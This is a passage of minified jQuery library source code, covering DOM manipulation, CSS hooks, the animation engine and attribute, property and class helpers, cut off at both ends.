        return n.nodeName(a, "table") && n.nodeName(11 !== b.nodeType ? b : b.firstChild, "tr") ? a.getElementsByTagName("tbody")[0] || a.appendChild(a.ownerDocument.createElement("tbody")) : a
    }

    function ka(a) {
        return a.type = (null !== a.getAttribute("type")) + "/" + a.type, a
    }

    function la(a) {
        var b = ga.exec(a.type);
        return b ? a.type = b[1] : a.removeAttribute("type"), a
    }

    function ma(a, b) {
        for (var c = 0, d = a.length; d > c; c++) L.set(a[c], "globalEval", !b || L.get(b[c], "globalEval"))
    }

    function na(a, b) {
        var c, d, e, f, g, h, i, j;
        if (1 === b.nodeType) {
            if (L.hasData(a) && (f = L.access(a), g = L.set(b, f), j = f.events)) {
                delete g.handle, g.events = {};
                for (e in j)
                    for (c = 0, d = j[e].length; d > c; c++) n.event.add(b, e, j[e][c])
            }
            M.hasData(a) && (h = M.access(a), i = n.extend({}, h), M.set(b, i))
        }
    }

    function oa(a, b) {
        var c = a.getElementsByTagName ? a.getElementsByTagName(b || "*") : a.querySelectorAll ? a.querySelectorAll(b || "*") : [];
        return void 0 === b || b && n.nodeName(a, b) ? n.merge([a], c) : c
    }

    function pa(a, b) {
        var c = b.nodeName.toLowerCase();
        "input" === c && T.test(a.type) ? b.checked = a.checked : ("input" === c || "textarea" === c) && (b.defaultValue = a.defaultValue)
    }
    n.extend({
        clone: function(a, b, c) {
            var d, e, f, g, h = a.cloneNode(!0),
                i = n.contains(a.ownerDocument, a);
            if (!(k.noCloneChecked || 1 !== a.nodeType && 11 !== a.nodeType || n.isXMLDoc(a)))
                for (g = oa(h), f = oa(a), d = 0, e = f.length; e > d; d++) pa(f[d], g[d]);
            if (b)
                if (c)
                    for (f = f || oa(a), g = g || oa(h), d = 0, e = f.length; e > d; d++) na(f[d], g[d]);
                else na(a, h);
            return g = oa(h, "script"), g.length > 0 && ma(g, !i && oa(a, "script")), h
        },
        buildFragment: function(a, b, c, d) {
            for (var e, f, g, h, i, j, k = b.createDocumentFragment(), l = [], m = 0, o = a.length; o > m; m++)
                if (e = a[m], e || 0 === e)
                    if ("object" === n.type(e)) n.merge(l, e.nodeType ? [e] : e);
                    else if (ca.test(e)) {
                        f = f || k.appendChild(b.createElement("div")), g = (ba.exec(e) || ["", ""])[1].toLowerCase(), h = ia[g] || ia._default, f.innerHTML = h[1] + e.replace(aa, "<$1></$2>") + h[2], j = h[0];
                        while (j--) f = f.lastChild;
                        n.merge(l, f.childNodes), f = k.firstChild, f.textContent = ""
                    } else l.push(b.createTextNode(e));
            k.textContent = "", m = 0;
            while (e = l[m++])
                if ((!d || -1 === n.inArray(e, d)) && (i = n.contains(e.ownerDocument, e), f = oa(k.appendChild(e), "script"), i && ma(f), c)) {
                    j = 0;
                    while (e = f[j++]) fa.test(e.type || "") && c.push(e)
                }
            return k
        },
        cleanData: function(a) {
            for (var b, c, d, e, f = n.event.special, g = 0; void 0 !== (c = a[g]); g++) {
                if (n.acceptData(c) && (e = c[L.expando], e && (b = L.cache[e]))) {
                    if (b.events)
                        for (d in b.events) f[d] ? n.event.remove(c, d) : n.removeEvent(c, d, b.handle);
                    L.cache[e] && delete L.cache[e]
                }
                delete M.cache[c[M.expando]]
            }
        }
    }), n.fn.extend({
        text: function(a) {
            return J(this, function(a) {
                return void 0 === a ? n.text(this) : this.empty().each(function() {
                    (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) && (this.textContent = a)
                })
            }, null, a, arguments.length)
        },
        append: function() {
            return this.domManip(arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = ja(this, a);
                    b.appendChild(a)
                }
            })
        },
        prepend: function() {
            return this.domManip(arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = ja(this, a);
                    b.insertBefore(a, b.firstChild)
                }
            })
        },
        before: function() {
            return this.domManip(arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this)
            })
        },
        after: function() {
            return this.domManip(arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this.nextSibling)
            })
        },
        remove: function(a, b) {
            for (var c, d = a ? n.filter(a, this) : this, e = 0; null != (c = d[e]); e++) b || 1 !== c.nodeType || n.cleanData(oa(c)), c.parentNode && (b && n.contains(c.ownerDocument, c) && ma(oa(c, "script")), c.parentNode.removeChild(c));
            return this
        },
        empty: function() {
            for (var a, b = 0; null != (a = this[b]); b++) 1 === a.nodeType && (n.cleanData(oa(a, !1)), a.textContent = "");
            return this
        },
        clone: function(a, b) {
            return a = null == a ? !1 : a, b = null == b ? a : b, this.map(function() {
                return n.clone(this, a, b)
            })
        },
        html: function(a) {
            return J(this, function(a) {
                var b = this[0] || {},
                    c = 0,
                    d = this.length;
                if (void 0 === a && 1 === b.nodeType) return b.innerHTML;
                if ("string" == typeof a && !da.test(a) && !ia[(ba.exec(a) || ["", ""])[1].toLowerCase()]) {
                    a = a.replace(aa, "<$1></$2>");
                    try {
                        for (; d > c; c++) b = this[c] || {}, 1 === b.nodeType && (n.cleanData(oa(b, !1)), b.innerHTML = a);
                        b = 0
                    } catch (e) {}
                }
                b && this.empty().append(a)
            }, null, a, arguments.length)
        },
        replaceWith: function() {
            var a = arguments[0];
            return this.domManip(arguments, function(b) {
                a = this.parentNode, n.cleanData(oa(this)), a && a.replaceChild(b, this)
            }), a && (a.length || a.nodeType) ? this : this.remove()
        },
        detach: function(a) {
            return this.remove(a, !0)
        },
        domManip: function(a, b) {
            a = e.apply([], a);
            var c, d, f, g, h, i, j = 0,
                l = this.length,
                m = this,
                o = l - 1,
                p = a[0],
                q = n.isFunction(p);
            if (q || l > 1 && "string" == typeof p && !k.checkClone && ea.test(p)) return this.each(function(c) {
                var d = m.eq(c);
                q && (a[0] = p.call(this, c, d.html())), d.domManip(a, b)
            });
            if (l && (c = n.buildFragment(a, this[0].ownerDocument, !1, this), d = c.firstChild, 1 === c.childNodes.length && (c = d), d)) {
                for (f = n.map(oa(c, "script"), ka), g = f.length; l > j; j++) h = c, j !== o && (h = n.clone(h, !0, !0), g && n.merge(f, oa(h, "script"))), b.call(this[j], h, j);
                if (g)
                    for (i = f[f.length - 1].ownerDocument, n.map(f, la), j = 0; g > j; j++) h = f[j], fa.test(h.type || "") && !L.access(h, "globalEval") && n.contains(i, h) && (h.src ? n._evalUrl && n._evalUrl(h.src) : n.globalEval(h.textContent.replace(ha, "")))
            }
            return this
        }
    }), n.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(a, b) {
        n.fn[a] = function(a) {
            for (var c, d = [], e = n(a), g = e.length - 1, h = 0; g >= h; h++) c = h === g ? this : this.clone(!0), n(e[h])[b](c), f.apply(d, c.get());
            return this.pushStack(d)
        }
    });
    var qa, ra = {};

    function sa(b, c) {
        var d, e = n(c.createElement(b)).appendTo(c.body),
            f = a.getDefaultComputedStyle && (d = a.getDefaultComputedStyle(e[0])) ? d.display : n.css(e[0], "display");
        return e.detach(), f
    }

    function ta(a) {
        var b = l,
            c = ra[a];
        return c || (c = sa(a, b), "none" !== c && c || (qa = (qa || n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement), b = qa[0].contentDocument, b.write(), b.close(), c = sa(a, b), qa.detach()), ra[a] = c), c
    }
    var ua = /^margin/,
        va = new RegExp("^(" + Q + ")(?!px)[a-z%]+$", "i"),
        wa = function(b) {
            return b.ownerDocument.defaultView.opener ? b.ownerDocument.defaultView.getComputedStyle(b, null) : a.getComputedStyle(b, null)
        };

    function xa(a, b, c) {
        var d, e, f, g, h = a.style;
        return c = c || wa(a), c && (g = c.getPropertyValue(b) || c[b]), c && ("" !== g || n.contains(a.ownerDocument, a) || (g = n.style(a, b)), va.test(g) && ua.test(b) && (d = h.width, e = h.minWidth, f = h.maxWidth, h.minWidth = h.maxWidth = h.width = g, g = c.width, h.width = d, h.minWidth = e, h.maxWidth = f)), void 0 !== g ? g + "" : g
    }

    function ya(a, b) {
        return {
            get: function() {
                return a() ? void delete this.get : (this.get = b).apply(this, arguments)
            }
        }
    }! function() {
        var b, c, d = l.documentElement,
            e = l.createElement("div"),
            f = l.createElement("div");
        if (f.style) {
            f.style.backgroundClip = "content-box", f.cloneNode(!0).style.backgroundClip = "", k.clearCloneStyle = "content-box" === f.style.backgroundClip, e.style.cssText = "border:0;width:0;height:0;top:0;left:-9999px;margin-top:1px;position:absolute", e.appendChild(f);

            function g() {
                f.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute", f.innerHTML = "", d.appendChild(e);
                var g = a.getComputedStyle(f, null);
                b = "1%" !== g.top, c = "4px" === g.width, d.removeChild(e)
            }
            a.getComputedStyle && n.extend(k, {
                pixelPosition: function() {
                    return g(), b
                },
                boxSizingReliable: function() {
                    return null == c && g(), c
                },
                reliableMarginRight: function() {
                    var b, c = f.appendChild(l.createElement("div"));
                    return c.style.cssText = f.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", c.style.marginRight = c.style.width = "0", f.style.width = "1px", d.appendChild(e), b = !parseFloat(a.getComputedStyle(c, null).marginRight), d.removeChild(e), f.removeChild(c), b
                }
            })
        }
    }(), n.swap = function(a, b, c, d) {
        var e, f, g = {};
        for (f in b) g[f] = a.style[f], a.style[f] = b[f];
        e = c.apply(a, d || []);
        for (f in b) a.style[f] = g[f];
        return e
    };
    var za = /^(none|table(?!-c[ea]).+)/,
        Aa = new RegExp("^(" + Q + ")(.*)$", "i"),
        Ba = new RegExp("^([+-])=(" + Q + ")", "i"),
        Ca = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        Da = {
            letterSpacing: "0",
            fontWeight: "400"
        },
        Ea = ["Webkit", "O", "Moz", "ms"];

    function Fa(a, b) {
        if (b in a) return b;
        var c = b[0].toUpperCase() + b.slice(1),
            d = b,
            e = Ea.length;
        while (e--)
            if (b = Ea[e] + c, b in a) return b;
        return d
    }

    function Ga(a, b, c) {
        var d = Aa.exec(b);
        return d ? Math.max(0, d[1] - (c || 0)) + (d[2] || "px") : b
    }

    function Ha(a, b, c, d, e) {
        for (var f = c === (d ? "border" : "content") ? 4 : "width" === b ? 1 : 0, g = 0; 4 > f; f += 2) "margin" === c && (g += n.css(a, c + R[f], !0, e)), d ? ("content" === c && (g -= n.css(a, "padding" + R[f], !0, e)), "margin" !== c && (g -= n.css(a, "border" + R[f] + "Width", !0, e))) : (g += n.css(a, "padding" + R[f], !0, e), "padding" !== c && (g += n.css(a, "border" + R[f] + "Width", !0, e)));
        return g
    }

    function Ia(a, b, c) {
        var d = !0,
            e = "width" === b ? a.offsetWidth : a.offsetHeight,
            f = wa(a),
            g = "border-box" === n.css(a, "boxSizing", !1, f);
        if (0 >= e || null == e) {
            if (e = xa(a, b, f), (0 > e || null == e) && (e = a.style[b]), va.test(e)) return e;
            d = g && (k.boxSizingReliable() || e === a.style[b]), e = parseFloat(e) || 0
        }
        return e + Ha(a, b, c || (g ? "border" : "content"), d, f) + "px"
    }

    function Ja(a, b) {
        for (var c, d, e, f = [], g = 0, h = a.length; h > g; g++) d = a[g], d.style && (f[g] = L.get(d, "olddisplay"), c = d.style.display, b ? (f[g] || "none" !== c || (d.style.display = ""), "" === d.style.display && S(d) && (f[g] = L.access(d, "olddisplay", ta(d.nodeName)))) : (e = S(d), "none" === c && e || L.set(d, "olddisplay", e ? c : n.css(d, "display"))));
        for (g = 0; h > g; g++) d = a[g], d.style && (b && "none" !== d.style.display && "" !== d.style.display || (d.style.display = b ? f[g] || "" : "none"));
        return a
    }
    n.extend({
        cssHooks: {
            opacity: {
                get: function(a, b) {
                    if (b) {
                        var c = xa(a, "opacity");
                        return "" === c ? "1" : c
                    }
                }
            }
        },
        cssNumber: {
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": "cssFloat"
        },
        style: function(a, b, c, d) {
            if (a && 3 !== a.nodeType && 8 !== a.nodeType && a.style) {
                var e, f, g, h = n.camelCase(b),
                    i = a.style;
                return b = n.cssProps[h] || (n.cssProps[h] = Fa(i, h)), g = n.cssHooks[b] || n.cssHooks[h], void 0 === c ? g && "get" in g && void 0 !== (e = g.get(a, !1, d)) ? e : i[b] : (f = typeof c, "string" === f && (e = Ba.exec(c)) && (c = (e[1] + 1) * e[2] + parseFloat(n.css(a, b)), f = "number"), null != c && c === c && ("number" !== f || n.cssNumber[h] || (c += "px"), k.clearCloneStyle || "" !== c || 0 !== b.indexOf("background") || (i[b] = "inherit"), g && "set" in g && void 0 === (c = g.set(a, c, d)) || (i[b] = c)), void 0)
            }
        },
        css: function(a, b, c, d) {
            var e, f, g, h = n.camelCase(b);
            return b = n.cssProps[h] || (n.cssProps[h] = Fa(a.style, h)), g = n.cssHooks[b] || n.cssHooks[h], g && "get" in g && (e = g.get(a, !0, c)), void 0 === e && (e = xa(a, b, d)), "normal" === e && b in Da && (e = Da[b]), "" === c || c ? (f = parseFloat(e), c === !0 || n.isNumeric(f) ? f || 0 : e) : e
        }
    }), n.each(["height", "width"], function(a, b) {
        n.cssHooks[b] = {
            get: function(a, c, d) {
                return c ? za.test(n.css(a, "display")) && 0 === a.offsetWidth ? n.swap(a, Ca, function() {
                    return Ia(a, b, d)
                }) : Ia(a, b, d) : void 0
            },
            set: function(a, c, d) {
                var e = d && wa(a);
                return Ga(a, c, d ? Ha(a, b, d, "border-box" === n.css(a, "boxSizing", !1, e), e) : 0)
            }
        }
    }), n.cssHooks.marginRight = ya(k.reliableMarginRight, function(a, b) {
        return b ? n.swap(a, {
            display: "inline-block"
        }, xa, [a, "marginRight"]) : void 0
    }), n.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(a, b) {
        n.cssHooks[a + b] = {
            expand: function(c) {
                for (var d = 0, e = {}, f = "string" == typeof c ? c.split(" ") : [c]; 4 > d; d++) e[a + R[d] + b] = f[d] || f[d - 2] || f[0];
                return e
            }
        }, ua.test(a) || (n.cssHooks[a + b].set = Ga)
    }), n.fn.extend({
        css: function(a, b) {
            return J(this, function(a, b, c) {
                var d, e, f = {},
                    g = 0;
                if (n.isArray(b)) {
                    for (d = wa(a), e = b.length; e > g; g++) f[b[g]] = n.css(a, b[g], !1, d);
                    return f
                }
                return void 0 !== c ? n.style(a, b, c) : n.css(a, b)
            }, a, b, arguments.length > 1)
        },
        show: function() {
            return Ja(this, !0)
        },
        hide: function() {
            return Ja(this)
        },
        toggle: function(a) {
            return "boolean" == typeof a ? a ? this.show() : this.hide() : this.each(function() {
                S(this) ? n(this).show() : n(this).hide()
            })
        }
    });

    function Ka(a, b, c, d, e) {
        return new Ka.prototype.init(a, b, c, d, e)
    }
    n.Tween = Ka, Ka.prototype = {
        constructor: Ka,
        init: function(a, b, c, d, e, f) {
            this.elem = a, this.prop = c, this.easing = e || "swing", this.options = b, this.start = this.now = this.cur(), this.end = d, this.unit = f || (n.cssNumber[c] ? "" : "px")
        },
        cur: function() {
            var a = Ka.propHooks[this.prop];
            return a && a.get ? a.get(this) : Ka.propHooks._default.get(this)
        },
        run: function(a) {
            var b, c = Ka.propHooks[this.prop];
            return this.options.duration ? this.pos = b = n.easing[this.easing](a, this.options.duration * a, 0, 1, this.options.duration) : this.pos = b = a, this.now = (this.end - this.start) * b + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), c && c.set ? c.set(this) : Ka.propHooks._default.set(this), this
        }
    }, Ka.prototype.init.prototype = Ka.prototype, Ka.propHooks = {
        _default: {
            get: function(a) {
                var b;
                return null == a.elem[a.prop] || a.elem.style && null != a.elem.style[a.prop] ? (b = n.css(a.elem, a.prop, ""), b && "auto" !== b ? b : 0) : a.elem[a.prop]
            },
            set: function(a) {
                n.fx.step[a.prop] ? n.fx.step[a.prop](a) : a.elem.style && (null != a.elem.style[n.cssProps[a.prop]] || n.cssHooks[a.prop]) ? n.style(a.elem, a.prop, a.now + a.unit) : a.elem[a.prop] = a.now
            }
        }
    }, Ka.propHooks.scrollTop = Ka.propHooks.scrollLeft = {
        set: function(a) {
            a.elem.nodeType && a.elem.parentNode && (a.elem[a.prop] = a.now)
        }
    }, n.easing = {
        linear: function(a) {
            return a
        },
        swing: function(a) {
            return .5 - Math.cos(a * Math.PI) / 2
        }
    }, n.fx = Ka.prototype.init, n.fx.step = {};
    var La, Ma, Na = /^(?:toggle|show|hide)$/,
        Oa = new RegExp("^(?:([+-])=|)(" + Q + ")([a-z%]*)$", "i"),
        Pa = /queueHooks$/,
        Qa = [Va],
        Ra = {
            "*": [function(a, b) {
                var c = this.createTween(a, b),
                    d = c.cur(),
                    e = Oa.exec(b),
                    f = e && e[3] || (n.cssNumber[a] ? "" : "px"),
                    g = (n.cssNumber[a] || "px" !== f && +d) && Oa.exec(n.css(c.elem, a)),
                    h = 1,
                    i = 20;
                if (g && g[3] !== f) {
                    f = f || g[3], e = e || [], g = +d || 1;
                    do h = h || ".5", g /= h, n.style(c.elem, a, g + f); while (h !== (h = c.cur() / d) && 1 !== h && --i)
                }
                return e && (g = c.start = +g || +d || 0, c.unit = f, c.end = e[1] ? g + (e[1] + 1) * e[2] : +e[2]), c
            }]
        };

    function Sa() {
        return setTimeout(function() {
            La = void 0
        }), La = n.now()
    }

    function Ta(a, b) {
        var c, d = 0,
            e = {
                height: a
            };
        for (b = b ? 1 : 0; 4 > d; d += 2 - b) c = R[d], e["margin" + c] = e["padding" + c] = a;
        return b && (e.opacity = e.width = a), e
    }

    function Ua(a, b, c) {
        for (var d, e = (Ra[b] || []).concat(Ra["*"]), f = 0, g = e.length; g > f; f++)
            if (d = e[f].call(c, b, a)) return d
    }

    function Va(a, b, c) {
        var d, e, f, g, h, i, j, k, l = this,
            m = {},
            o = a.style,
            p = a.nodeType && S(a),
            q = L.get(a, "fxshow");
        c.queue || (h = n._queueHooks(a, "fx"), null == h.unqueued && (h.unqueued = 0, i = h.empty.fire, h.empty.fire = function() {
            h.unqueued || i()
        }), h.unqueued++, l.always(function() {
            l.always(function() {
                h.unqueued--, n.queue(a, "fx").length || h.empty.fire()
            })
        })), 1 === a.nodeType && ("height" in b || "width" in b) && (c.overflow = [o.overflow, o.overflowX, o.overflowY], j = n.css(a, "display"), k = "none" === j ? L.get(a, "olddisplay") || ta(a.nodeName) : j, "inline" === k && "none" === n.css(a, "float") && (o.display = "inline-block")), c.overflow && (o.overflow = "hidden", l.always(function() {
            o.overflow = c.overflow[0], o.overflowX = c.overflow[1], o.overflowY = c.overflow[2]
        }));
        for (d in b)
            if (e = b[d], Na.exec(e)) {
                if (delete b[d], f = f || "toggle" === e, e === (p ? "hide" : "show")) {
                    if ("show" !== e || !q || void 0 === q[d]) continue;
                    p = !0
                }
                m[d] = q && q[d] || n.style(a, d)
            } else j = void 0;
        if (n.isEmptyObject(m)) "inline" === ("none" === j ? ta(a.nodeName) : j) && (o.display = j);
        else {
            q ? "hidden" in q && (p = q.hidden) : q = L.access(a, "fxshow", {}), f && (q.hidden = !p), p ? n(a).show() : l.done(function() {
                n(a).hide()
            }), l.done(function() {
                var b;
                L.remove(a, "fxshow");
                for (b in m) n.style(a, b, m[b])
            });
            for (d in m) g = Ua(p ? q[d] : 0, d, l), d in q || (q[d] = g.start, p && (g.end = g.start, g.start = "width" === d || "height" === d ? 1 : 0))
        }
    }

    function Wa(a, b) {
        var c, d, e, f, g;
        for (c in a)
            if (d = n.camelCase(c), e = b[d], f = a[c], n.isArray(f) && (e = f[1], f = a[c] = f[0]), c !== d && (a[d] = f, delete a[c]), g = n.cssHooks[d], g && "expand" in g) {
                f = g.expand(f), delete a[d];
                for (c in f) c in a || (a[c] = f[c], b[c] = e)
            } else b[d] = e
    }

    function Xa(a, b, c) {
        var d, e, f = 0,
            g = Qa.length,
            h = n.Deferred().always(function() {
                delete i.elem
            }),
            i = function() {
                if (e) return !1;
                for (var b = La || Sa(), c = Math.max(0, j.startTime + j.duration - b), d = c / j.duration || 0, f = 1 - d, g = 0, i = j.tweens.length; i > g; g++) j.tweens[g].run(f);
                return h.notifyWith(a, [j, f, c]), 1 > f && i ? c : (h.resolveWith(a, [j]), !1)
            },
            j = h.promise({
                elem: a,
                props: n.extend({}, b),
                opts: n.extend(!0, {
                    specialEasing: {}
                }, c),
                originalProperties: b,
                originalOptions: c,
                startTime: La || Sa(),
                duration: c.duration,
                tweens: [],
                createTween: function(b, c) {
                    var d = n.Tween(a, j.opts, b, c, j.opts.specialEasing[b] || j.opts.easing);
                    return j.tweens.push(d), d
                },
                stop: function(b) {
                    var c = 0,
                        d = b ? j.tweens.length : 0;
                    if (e) return this;
                    for (e = !0; d > c; c++) j.tweens[c].run(1);
                    return b ? h.resolveWith(a, [j, b]) : h.rejectWith(a, [j, b]), this
                }
            }),
            k = j.props;
        for (Wa(k, j.opts.specialEasing); g > f; f++)
            if (d = Qa[f].call(j, a, k, j.opts)) return d;
        return n.map(k, Ua, j), n.isFunction(j.opts.start) && j.opts.start.call(a, j), n.fx.timer(n.extend(i, {
            elem: a,
            anim: j,
            queue: j.opts.queue
        })), j.progress(j.opts.progress).done(j.opts.done, j.opts.complete).fail(j.opts.fail).always(j.opts.always)
    }
    n.Animation = n.extend(Xa, {
        tweener: function(a, b) {
            n.isFunction(a) ? (b = a, a = ["*"]) : a = a.split(" ");
            for (var c, d = 0, e = a.length; e > d; d++) c = a[d], Ra[c] = Ra[c] || [], Ra[c].unshift(b)
        },
        prefilter: function(a, b) {
            b ? Qa.unshift(a) : Qa.push(a)
        }
    }), n.speed = function(a, b, c) {
        var d = a && "object" == typeof a ? n.extend({}, a) : {
            complete: c || !c && b || n.isFunction(a) && a,
            duration: a,
            easing: c && b || b && !n.isFunction(b) && b
        };
        return d.duration = n.fx.off ? 0 : "number" == typeof d.duration ? d.duration : d.duration in n.fx.speeds ? n.fx.speeds[d.duration] : n.fx.speeds._default, (null == d.queue || d.queue === !0) && (d.queue = "fx"), d.old = d.complete, d.complete = function() {
            n.isFunction(d.old) && d.old.call(this), d.queue && n.dequeue(this, d.queue)
        }, d
    }, n.fn.extend({
        fadeTo: function(a, b, c, d) {
            return this.filter(S).css("opacity", 0).show().end().animate({
                opacity: b
            }, a, c, d)
        },
        animate: function(a, b, c, d) {
            var e = n.isEmptyObject(a),
                f = n.speed(b, c, d),
                g = function() {
                    var b = Xa(this, n.extend({}, a), f);
                    (e || L.get(this, "finish")) && b.stop(!0)
                };
            return g.finish = g, e || f.queue === !1 ? this.each(g) : this.queue(f.queue, g)
        },
        stop: function(a, b, c) {
            var d = function(a) {
                var b = a.stop;
                delete a.stop, b(c)
            };
            return "string" != typeof a && (c = b, b = a, a = void 0), b && a !== !1 && this.queue(a || "fx", []), this.each(function() {
                var b = !0,
                    e = null != a && a + "queueHooks",
                    f = n.timers,
                    g = L.get(this);
                if (e) g[e] && g[e].stop && d(g[e]);
                else
                    for (e in g) g[e] && g[e].stop && Pa.test(e) && d(g[e]);
                for (e = f.length; e--;) f[e].elem !== this || null != a && f[e].queue !== a || (f[e].anim.stop(c), b = !1, f.splice(e, 1));
                (b || !c) && n.dequeue(this, a)
            })
        },
        finish: function(a) {
            return a !== !1 && (a = a || "fx"), this.each(function() {
                var b, c = L.get(this),
                    d = c[a + "queue"],
                    e = c[a + "queueHooks"],
                    f = n.timers,
                    g = d ? d.length : 0;
                for (c.finish = !0, n.queue(this, a, []), e && e.stop && e.stop.call(this, !0), b = f.length; b--;) f[b].elem === this && f[b].queue === a && (f[b].anim.stop(!0), f.splice(b, 1));
                for (b = 0; g > b; b++) d[b] && d[b].finish && d[b].finish.call(this);
                delete c.finish
            })
        }
    }), n.each(["toggle", "show", "hide"], function(a, b) {
        var c = n.fn[b];
        n.fn[b] = function(a, d, e) {
            return null == a || "boolean" == typeof a ? c.apply(this, arguments) : this.animate(Ta(b, !0), a, d, e)
        }
    }), n.each({
        slideDown: Ta("show"),
        slideUp: Ta("hide"),
        slideToggle: Ta("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(a, b) {
        n.fn[a] = function(a, c, d) {
            return this.animate(b, a, c, d)
        }
    }), n.timers = [], n.fx.tick = function() {
        var a, b = 0,
            c = n.timers;
        for (La = n.now(); b < c.length; b++) a = c[b], a() || c[b] !== a || c.splice(b--, 1);
        c.length || n.fx.stop(), La = void 0
    }, n.fx.timer = function(a) {
        n.timers.push(a), a() ? n.fx.start() : n.timers.pop()
    }, n.fx.interval = 13, n.fx.start = function() {
        Ma || (Ma = setInterval(n.fx.tick, n.fx.interval))
    }, n.fx.stop = function() {
        clearInterval(Ma), Ma = null
    }, n.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    }, n.fn.delay = function(a, b) {
        return a = n.fx ? n.fx.speeds[a] || a : a, b = b || "fx", this.queue(b, function(b, c) {
            var d = setTimeout(b, a);
            c.stop = function() {
                clearTimeout(d)
            }
        })
    },
        function() {
            var a = l.createElement("input"),
                b = l.createElement("select"),
                c = b.appendChild(l.createElement("option"));
            a.type = "checkbox", k.checkOn = "" !== a.value, k.optSelected = c.selected, b.disabled = !0, k.optDisabled = !c.disabled, a = l.createElement("input"), a.value = "t", a.type = "radio", k.radioValue = "t" === a.value
        }();
    var Ya, Za, $a = n.expr.attrHandle;
    n.fn.extend({
        attr: function(a, b) {
            return J(this, n.attr, a, b, arguments.length > 1)
        },
        removeAttr: function(a) {
            return this.each(function() {
                n.removeAttr(this, a)
            })
        }
    }), n.extend({
        attr: function(a, b, c) {
            var d, e, f = a.nodeType;
            if (a && 3 !== f && 8 !== f && 2 !== f) return typeof a.getAttribute === U ? n.prop(a, b, c) : (1 === f && n.isXMLDoc(a) || (b = b.toLowerCase(), d = n.attrHooks[b] || (n.expr.match.bool.test(b) ? Za : Ya)),
                void 0 === c ? d && "get" in d && null !== (e = d.get(a, b)) ? e : (e = n.find.attr(a, b), null == e ? void 0 : e) : null !== c ? d && "set" in d && void 0 !== (e = d.set(a, c, b)) ? e : (a.setAttribute(b, c + ""), c) : void n.removeAttr(a, b))
        },
        removeAttr: function(a, b) {
            var c, d, e = 0,
                f = b && b.match(E);
            if (f && 1 === a.nodeType)
                while (c = f[e++]) d = n.propFix[c] || c, n.expr.match.bool.test(c) && (a[d] = !1), a.removeAttribute(c)
        },
        attrHooks: {
            type: {
                set: function(a, b) {
                    if (!k.radioValue && "radio" === b && n.nodeName(a, "input")) {
                        var c = a.value;
                        return a.setAttribute("type", b), c && (a.value = c), b
                    }
                }
            }
        }
    }), Za = {
        set: function(a, b, c) {
            return b === !1 ? n.removeAttr(a, c) : a.setAttribute(c, c), c
        }
    }, n.each(n.expr.match.bool.source.match(/\w+/g), function(a, b) {
        var c = $a[b] || n.find.attr;
        $a[b] = function(a, b, d) {
            var e, f;
            return d || (f = $a[b], $a[b] = e, e = null != c(a, b, d) ? b.toLowerCase() : null, $a[b] = f), e
        }
    });
    var _a = /^(?:input|select|textarea|button)$/i;
    n.fn.extend({
        prop: function(a, b) {
            return J(this, n.prop, a, b, arguments.length > 1)
        },
        removeProp: function(a) {
            return this.each(function() {
                delete this[n.propFix[a] || a]
            })
        }
    }), n.extend({
        propFix: {
            "for": "htmlFor",
            "class": "className"
        },
        prop: function(a, b, c) {
            var d, e, f, g = a.nodeType;
            if (a && 3 !== g && 8 !== g && 2 !== g) return f = 1 !== g || !n.isXMLDoc(a), f && (b = n.propFix[b] || b, e = n.propHooks[b]), void 0 !== c ? e && "set" in e && void 0 !== (d = e.set(a, c, b)) ? d : a[b] = c : e && "get" in e && null !== (d = e.get(a, b)) ? d : a[b]
        },
        propHooks: {
            tabIndex: {
                get: function(a) {
                    return a.hasAttribute("tabindex") || _a.test(a.nodeName) || a.href ? a.tabIndex : -1
                }
            }
        }
    }), k.optSelected || (n.propHooks.selected = {
        get: function(a) {
            var b = a.parentNode;
            return b && b.parentNode && b.parentNode.selectedIndex, null
        }
    }), n.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        n.propFix[this.toLowerCase()] = this
    });
    var ab = /[\t\r\n\f]/g;
    n.fn.extend({
        addClass: function(a) {
            var b, c, d, e, f, g, h = "string" == typeof a && a,
                i = 0,
                j = this.length;
            if (n.isFunction(a)) return this.each(function(b) {
                n(this).addClass(a.call(this, b, this.className))
            });
            if (h)
                for (b = (a || "").match(E) || []; j > i; i++)
                    if (c = this[i], d = 1 === c.nodeType && (c.className ? (" " + c.className + " ").replace(ab, " ") : " ")) {
                        f = 0;
                        while (e = b[f++]) d.indexOf(" " + e + " ") < 0 && (d += e + " ");
                        g = n.trim(d), c.className !== g && (c.className = g)
                    }
            return this
        },
        removeClass: function(a) {
            var b, c, d, e, f, g, h = 0 === arguments.length || "string" == typeof a && a,
                i = 0,
                j = this.length;
            if (n.isFunction(a)) return this.each(function(b) {
                n(this).removeClass(a.call(this, b, this.className))
            });
            if (h)
                for (b = (a || "").match(E) || []; j > i; i++)
                    if (c = this[i], d = 1 === c.nodeType && (c.className ? (" " + c.className + " ").replace(ab, " ") : "")) {
                        f = 0;
                        while (e = b[f++])
                            while (d.indexOf(" " + e + " ") >= 0) d = d.replace(" " + e + " ", " ");
                        g = a ? n.trim(d) : "", c.className !== g && (c.className = g)
                    }
            return this
        },
        toggleClass: function(a, b) {
            var c = typeof a;
